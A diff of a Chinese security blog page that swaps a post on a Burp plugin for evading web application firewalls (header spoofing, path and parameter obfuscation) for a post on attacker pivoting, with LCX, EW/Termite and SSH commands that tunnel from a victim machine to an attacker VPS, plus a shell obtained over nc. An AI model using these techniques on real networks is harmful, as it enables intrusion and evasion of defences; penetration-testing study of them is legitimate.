@@ -14,11 +14,11 @@
     <script async defer src="https://buttons.github.io/buttons.js"></script>
     <title>
         
-          Bypass WAF --- Burp Plugin - Rootclay
+          内网代理 - Rootclay
         
     </title>
 
-    <link rel="canonical" href="http://rootclay.github.io/2017/03/18/Burp_bypass_plugin/">
+    <link rel="canonical" href="http://rootclay.github.io/2017/07/25/内网代理/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -86,16 +86,14 @@
                     <div class="post-heading">
                         <div class="tags">
                             
-                              <a class="tag" href="/tags/#Tools" title="Tools">Tools</a>
-                            
                               <a class="tag" href="/tags/#Web" title="Web">Web</a>
                             
                         </div>
-                        <h1>Bypass WAF --- Burp Plugin</h1>
-                        <h2 class="subheading">一些常见的burp插件,加上这些插件来绕过一定的WAF.</h2>
+                        <h1>内网代理</h1>
+                        <h2 class="subheading">内网代理的个人总结.</h2>
                         <span class="meta">
                             Posted by Rootclay on
-                            2017-03-18
+                            2017-07-25
                         </span>
                     </div>
                 
@@ -213,49 +211,56 @@
                 post-container">
 
                 <blockquote>
-<p>To use this plugin to add the necessary headers, first you need to either download the<br>
-Python version of the plugin, the Java version of the plugin, or the Java source and<br>
-compile yourself. Once you have the plugin, start up Burp and navigate to “Extender-<br>
-Extensions” and click the “Add” button. Choose an extension type of “Java”, if using the<br>
-Java Plugin, or “Python”, if using the Python version, and then navigate to the extension<br>
-path. The configuration should look something like:</p>
+<p>总结自己在实际运用过程中遇到的代理总结</p>
 </blockquote>
-<p><img src="./img/bypass_waf/1.png" alt=""></p>
-<p>The plugin should now be loaded and display something like:</p>
-<p><img src="./img/bypass_waf/2.png" alt=""></p>
-<p>Now you need to navigate to “Projecr options-&gt;Sessions” and then click on the “Add” button for the “Session Handling Rules” configuration section as shown below:</p>
-<p><img src="./img/bypass_waf/3.png" alt=""></p>
-<p>Give the rule a name and then click the “Add” button in the “Rule Actions” section, and choose “Invoke a Burp extension” as shown below:</p>
-<p><img src="./img/bypass_waf/4.png" alt=""></p>
-<p>You should be able to select “Bypass WAF” in the drop down box as seen below:</p>
-<p><img src="./img/bypass_waf/5.png" alt=""></p>
-<p>Bypass WAF contains the following features:</p>
-<p><img src="./img/bypass_waf/6.png" alt=""></p>
-<p>Most of the new features are based on Ivan Ristic’s WAF bypass work found here and here. A description of each feature follows:</p>
-<ol>
-<li>Users can modify the X-Originating-IP, X-Forwarded-For, X-Remote-IP, X-Remote-Addr headers sent in each request. This is probably the top bypass technique i the tool. It isn’t unusual for a WAF to be configured to trust itself (127.0.0.1) or an upstream proxy device, which is what this bypass targets.</li>
-<li>The “Content-Type” header can remain unchanged in each request, removed from all requests, or by modified to one of the many other options for each request. Some WAFs will only decode/evaluate requests based on known content types, this feature targets that weakness.</li>
-<li>The “Host” header can also be modified. Poorly configured WAFs might be configured to only evaluate requests based on the correct FQDN of the host found in this header, which is what this bypass targets.</li>
-<li>The request type option allows the Burp user to only use the remaining bypass techniques on the given request method of “GET” or “POST”, or to apply them on all requests.</li>
-<li>The path injection feature can leave a request unmodified, inject random path info information (/path/to/example.php/randomvalue?restofquery), or inject a random path parameter (/path/to/example.php;randomparam=randomvalue?resetofquery). This can be used to bypass poorly written rules that rely on path information.</li>
-<li>The path obfuscation feature modifies the last forward slash in the path to a random value, or by default does nothing. The last slash can be modified to one of many values that in many cases results in a still valid request but can bypass poorly written WAF rules that rely on path information.</li>
-<li>The parameter obfuscation feature is language specific. PHP will discard a + at the beginning of each parameter, but a poorly written WAF rule might be written for specific parameter names, thus ignoring parameters with a + at the beginning. Similarly, ASP discards a % at the beginning of each parameter.</li>
-<li>The “Set Configuration” button activates all the settings that you have chosen.</li>
-</ol>
-
+<h2 id="0x00-引言">0x00 引言</h2>
+<p>早期我们可能会采用HTTP Proxy代理，在浏览器上设置下代理服务器的IP、端口、认证账户和密码。但有些软件的网络通信数据并不是HTTP协议，就需要寻找其它方法。</p>
+<p>SOCKS代理是个不错的解决方案，不管应用层是什么协议，只要是传输层是TCP协议就可以代理。SOCKS代理中最新的协议是SOCKS5。相对SOCKS4作了大幅度的增强。</p>
+<p>首先，它增加了对UDP协议的支持；其次，可支持多种用户身份验证方式和通信加密方式；最后，修改了SOCKS服务器进行域名解析的方法，使其更加优雅。</p>
+<h2 id="0x01-端口转发">0x01 端口转发</h2>
+<p>我们平常用到的LCX只能做到端口对端口的转发：</p>
+<p>1、 VPS</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lcx.exe –listen 8080 80</div></pre></td></tr></table></figure>
+<p>2、 受害机</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lcx.exe –slave X.X.X.X 80 127.0.0.1 80</div></pre></td></tr></table></figure>
+<p>本地80端口转发到远程80</p>
+<p>3、 Attacker</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">http://X.X.X.X:8080</span></div></pre></td></tr></table></figure>
+<h2 id="0x02-工具">0x02 工具</h2>
+<p>Socks代理工具我用到的主要如下：</p>
+<p>Termite（原EW代理）</p>
+<p>EW不用说，肯定大家应该都用过，这里把原EW的简单用法和Termite的简单用法都写一下</p>
+<p>EW：</p>
+<p>1、 VPS:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ew -s rcsocks -l 1080 -e 8888</div></pre></td></tr></table></figure>
+<p>2、 受害机</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ew -s rssocks -d 112.74.201.135 -e 8888</div></pre></td></tr></table></figure>
+<p>Termite：</p>
+<p>1、 Server</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">agent -l 8888</div><div class="line">构建更加深的网络：</div><div class="line">已控制的主机连接进入代理网络：</div><div class="line">agent -c x.x.x.x -p 8888</div></pre></td></tr></table></figure>
+<p>2、 admin管理</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">admin -c x.x.x.x -p 8888</div></pre></td></tr></table></figure>
+<p>进入代理之后：</p>
+<p>3、 深层网络连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">exmple: </div><div class="line">Host3:192.168.3.1</div><div class="line">Host4:192.168.3.2</div><div class="line"></div><div class="line">1. 在Host4上:agent -l 8888</div><div class="line">2. goto 3       connect 192.168.3.2 8888可以把</div></pre></td></tr></table></figure>
+<p>4、 代理进入机器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1. goto ID</div><div class="line">2. socks 1080</div><div class="line">3. 本地连接127.0.0.1 1080就可以了</div></pre></td></tr></table></figure>
+<p>5、 TCP端口转发</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1. goto 2 </div><div class="line">2. lcxtran 3388 10.0.0.1 3389</div><div class="line">   以2号节点为跳板，将 10.0.0.1 的 3389 端口映射至本地的 3388 端口</div><div class="line">3. 连接就只需要本地连接127.0.0.1 的3388端口</div></pre></td></tr></table></figure>
+<p>6、 Shell反弹</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1. goto 1</div><div class="line">2. shell 7777</div><div class="line">   此时，通过nc本地的 7777 端口，就可以得到一个 1 节点提供的 shell.</div><div class="line">3. nc 127.0.0.1 7777 就是一个1号机的shell</div></pre></td></tr></table></figure>
+<p>SSH转发/socks：</p>
+<p>1、 内网主机：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">转发：</div><div class="line">1. ssh -CfNg -R 2222:127.0.0.1:22 VPS-user@VPS -p 53    //内网</div><div class="line">2. ssh -CfNg -L 8080:127.0.0.1:2222 VPS-user@VPS       //VPS</div><div class="line">本地访问VPS:8080就是内网的22端口</div><div class="line"></div><div class="line">socket代理:</div><div class="line">ssh -qTfnN -D port remotehost</div><div class="line">在终端中运行 ssh -qTfnN -D 6080 user@theserver ，然后在浏览器或者软件中设置好代理参数 socks5: 127.0.0.1:6080 后便可以使用.</div></pre></td></tr></table></figure>
                 
 
                 <hr>
                 <!-- Pager -->
                 <ul class="pager">
                     
-                        <li class="previous">
-                            <a href="/2017/03/18/测试文章/" data-toggle="tooltip" data-placement="top" title="[Hexo] Theme BeanTech">&larr; Previous Post</a>
-                        </li>
-                    
                     
                         <li class="next">
-                            <a href="/2017/03/15/nmap/" data-toggle="tooltip" data-placement="top" title="HACK LIKE A PRO">Next Post &rarr;</a>
+                            <a href="/2017/06/01/Esrc议题/" data-toggle="tooltip" data-placement="top" title="ESRC成都站议题分享">Next Post &rarr;</a>
                         </li>
                     
                 </ul>
@@ -285,7 +290,7 @@ path. The configuration should look something like:</p>
         <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-          <ol class="nav">none</ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x00-引言"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">0x00 引言</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x01-端口转发"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">0x01 端口转发</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x02-工具"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">0x02 工具</span></a></li></ol>
         
         </div>
       </aside>
@@ -305,8 +310,6 @@ path. The configuration should look something like:</p>
                     <h5><a href="/tags/">FEATURED TAGS</a></h5>
                     <div class="tags">
                        
-                          <a class="tag" href="/tags/#Tools" title="Tools">Tools</a>
-                        
                           <a class="tag" href="/tags/#Web" title="Web">Web</a>
                         
                     </div>
@@ -354,8 +357,8 @@ path. The configuration should look something like:</p>
 <script type="text/javascript">
     /* * * CONFIGURATION VARIABLES * * */
     var disqus_shortname = "your-disqus-ID";
-    var disqus_identifier = "http://rootclay.github.io/2017/03/18/Burp_bypass_plugin/";
-    var disqus_url = "http://rootclay.github.io/2017/03/18/Burp_bypass_plugin/";
+    var disqus_identifier = "http://rootclay.github.io/2017/07/25/内网代理/";
+    var disqus_url = "http://rootclay.github.io/2017/07/25/内网代理/";
 
     (function() {
         var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
